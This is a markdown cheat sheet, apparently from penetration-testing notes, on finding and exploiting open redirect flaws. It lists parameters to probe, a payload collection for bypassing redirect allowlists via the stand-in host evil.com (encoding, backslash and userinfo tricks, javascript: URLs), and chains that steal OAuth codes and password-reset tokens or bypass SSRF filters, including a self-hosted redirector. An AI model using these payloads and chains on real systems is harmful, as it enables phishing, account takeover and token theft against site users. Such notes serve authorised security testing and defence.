# Open Redirect

**TL;DR**: the app redirects to a URL you control. Weak alone (phishing), but **powerful when chained**: OAuth/reset token theft, SSRF filter bypass, CSP/allowlist bypass.

## Where to look
- Params: `redirect`, `redirect_uri`, `redirect_url`, `url`, `next`, `return`, `returnUrl`, `returnTo`, `dest`, `destination`, `continue`, `goto`, `r`, `u`, `link`, `checkout_url`, `callback`, `success_url`, `back`, `forward`, `out`, `to`.
- Flows: after login/logout, SSO/OAuth callback, email links, internal "continue to", shorteners.

## Detection
- Set `https://evil.com` (or a domain you own) → followed? Check `Location` header (302) or JS redirect (`window.location`)/meta refresh.

## Payloads & allowlist bypass
- Direct: `?next=https://evil.com`, `//evil.com`, `https:evil.com`, `https:/evil.com`.
- Protocol-relative: `//evil.com`, `/\evil.com`, `/%2f%2fevil.com`, `\/\/evil.com`.
- Backslash tricks (parser divergence): `https://target.com\@evil.com`, `https://evil.com\.target.com`.
- `@` userinfo: `https://target.com@evil.com`.
- Subdomain/decoy: `https://evil.com/target.com`, `https://target.com.evil.com`, `https://targetcom.evil.com`.
- Allowlist "must contain target.com": `https://evil.com/?x=target.com`, `https://evil.com#target.com`, `https://target.com.evil.com`.
- Encoding: `%2f`, double-encode, unicode (`https://evil。com`, fullwidth), `%00`, CRLF (`%0d%0a`).
- `data:`/`javascript:` scheme (→ sometimes XSS): `javascript:alert(document.domain)`, `data:text/html,...`.
- Scheme whitelist: `//`, `\\`, scheme omission.

## Chaining (where it gets serious)
- **VPS redirector helper**: host a tiny `redirection.php?url=` (302 to any target) on your box to turn a strict allowlisted redirect into an arbitrary one, and to bounce SSRF/OAuth `redirect_uri` allowlists toward internal/attacker targets.
- **OAuth `redirect_uri`** open redirect → steal `code`/`token` → **ATO** (`OAUTH.md`).
- **Password reset / magic link** redirected → token in Referer to evil.
- **SSRF filter bypass**: an allowed URL that redirects to internal (`SSRF.md`).
- **CSP/allowlist bypass**, **cookie/token leak via Referer**.
- **XSS** if `javascript:`/`data:` is accepted in the sink.

## Impact
- Alone: Low (phishing). Chained (OAuth/reset/SSRF): High/Critical → always hunt for the chain.

## Caido
- Automate: bypass wordlist on the param, grep-match on `Location: ` containing your domain. Confirm JS redirect via Chrome if client-side.

## References
- PortSwigger - DOM-based open redirection - https://portswigger.net/web-security/dom-based/open-redirection
- PayloadsAllTheThings - Open Redirect - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- OWASP - Unvalidated Redirects & Forwards Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- OWASP WSTG - Testing for Client-side URL Redirect - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect
